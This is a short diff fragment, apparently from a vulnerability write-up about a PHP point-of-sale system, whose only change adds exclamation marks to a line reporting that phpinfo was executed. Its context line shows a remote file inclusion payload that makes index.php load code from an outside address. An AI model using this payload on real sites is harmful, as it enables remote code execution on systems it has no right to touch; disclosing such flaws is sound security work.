@@ -26,4 +26,4 @@ Payload:index.php?page=http://Remote_address/1
 ![3](/img/Best-pos-management-system-in-php/3.png)
 ![4](/img/Best-pos-management-system-in-php/4.png)
 
-Successfully executed phpinfo function!
+Successfully executed phpinfo function!!!
